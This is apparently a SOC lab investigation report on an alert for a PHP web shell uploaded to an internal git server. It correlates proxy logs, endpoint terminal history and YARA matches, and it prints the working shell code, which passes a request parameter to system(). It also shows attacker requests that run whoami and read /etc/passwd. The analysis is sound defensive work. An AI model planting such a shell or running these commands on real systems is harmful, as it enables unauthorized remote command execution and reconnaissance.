# SOC128 – Malicious File Upload Attempt (Event ID 62)

## 1. Alert Overview

| Field | Details |
|---|---|
| Event ID | 62 |
| Alert Rule | SOC128 – Malicious File Upload Attempt |
| Event Time | `2021-02-22 16:31:01 (UTC+03:00)` |
| Alert Type | Malware |
| MITRE ATT&CK (alert metadata) | `T1204` |
| File Name | `phpshell.php` |
| File Size | `113 bytes` |
| File Hash (MD5) | `756215a64e7d43153298f1a5a5fde295` |
| Host | `gitServer` (`172.16.20.4`) |
| Device Action | **Allowed** |
| Final Verdict | **True Positive** |

## 2. Investigation Findings

### 2.1. Proxy / Log Management Analysis

Log Management recorded requests from external IP `49.234.71.65` to the internal web server `172.16.20.4` over HTTP (port 80). All three requests had a device action of **Allowed**.

The Log Management timestamps in this lab are one hour behind the alert and endpoint timeline. The table below shows both the displayed log time and the time after applying the one-hour offset.

| Log Time (displayed) | Adjusted Time | HTTP Request | Device Action |
|---|---|---|---|
| `15:31:56` | `16:31:56` | `GET /srcCode/upload.php` | Allowed |
| `15:32:33` | `16:32:33` | `GET /srcCode/phpshell.php?cmd=whoami` | Allowed |
| `15:33:15` | `16:33:15` | `GET /srcCode/phpshell.php?cmd=cat /etc/passwd` | Allowed |

The requests show access to the upload endpoint followed by requests to `phpshell.php` with operating-system commands supplied through the `cmd` parameter. The Proxy's **Allowed** action confirms that the requests were permitted by the device; by itself, that status would not prove command execution.

### 2.2. Endpoint Security – Terminal History

Endpoint terminal history recorded the following commands on the internal server:

| Endpoint Time | Command |
|---|---|
| `2021-02-22 16:32` | `whoami` |
| `2021-02-22 16:33` | `cat /etc/passwd` |

These commands match the `cmd` parameters in the HTTP requests once the known one-hour Log Management offset is applied. The same-minute correlation between the incoming requests and the endpoint command history is strong evidence that the commands were executed on the server through the PHP web shell.

### 2.3. File and YARA Analysis

Filescan classified the sample as **Confirmed Threat** and reported two matching YARA rules:

- `webshell_simple_backdoor` — strength `0.75`, described as a Web Shell / simple backdoor.
- `WEBSHELL_PHP_Generic` — strength `0.75`, described as a generic PHP web-shell detection rule.

The report's [Extracted Strings](https://www.filescan.io/uploads/undefined/reports/45ae7952-7dcd-4294-a13c-a4ca3f34b710/strings) section contained this PHP code:

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**Code interpretation:**

- `isset($_REQUEST['cmd'])` checks whether the request contains a `cmd` parameter. Depending on PHP configuration, `$_REQUEST` can include values from GET, POST, and Cookie data.
- `$cmd = ($_REQUEST['cmd']);` assigns the supplied value to the `$cmd` variable.
- `system($cmd);` passes the supplied string to the operating system for execution under the privileges of the account running the web server.
- The `<pre>` tags format the command output for display in the HTTP response.
- `die;` stops the PHP script after this block.

This is a functional command-execution web shell: it accepts a caller-controlled command through an HTTP request and passes it to `system()`. No authentication check is visible in the provided code.

The YARA matches support the classification, while the code itself directly demonstrates the web-shell behavior. The reported strength of `0.75` is a rule-match strength and should not be interpreted as a 75% statistical probability.

### 2.4. Correlation Summary

The evidence forms a consistent sequence:

1. An HTTP request accessed `/srcCode/upload.php`.
2. Subsequent requests targeted `/srcCode/phpshell.php` and supplied `whoami` and `cat /etc/passwd) through `cmd`.
3. Endpoint terminal history recorded those same commands at the corresponding adjusted times.
4. Filescan identified the PHP sample as a confirmed threat, and its extracted code contains a direct call to `system($cmd)`.

Together, these findings support that the PHP web shell was accessed and used to execute commands, rather than being only an attempted upload with no evidence of use.

## 3. Playbook Investigation

### 3.1. Analyze Malware

**Result: Malicious**

Filescan returned a **Confirmed Threat** verdict, two web-shell-related YARA matches, and PHP code that executes a command supplied through the request.

### 3.2. Check If Malware Was Quarantined / Cleaned

**Result: Not Quarantined**

The alert metadata shows the device action as **Allowed**, and the playbook result indicates the file was not quarantined.

### 3.3. Check If Someone Accessed the URL / Requested the C2

**Result: Accessed**

The Proxy logs show requests to the PHP web shell, and endpoint terminal history records the same commands supplied in those requests. No reverse-direction network log is required to establish access here because command execution is corroborated by the endpoint evidence.

## 4. Final Assessment

**Verdict: True Positive**

The alert correctly identified a malicious PHP web shell, `phpshell.php`. Filescan classified the sample as a confirmed threat, the extracted PHP code exposed command execution through `system($cmd)`, and the Proxy requests correlated with endpoint terminal history for `whoami` and `cat /etc/passwd`. The evidence supports that the web shell was accessed and used to execute commands on `gitServer`.
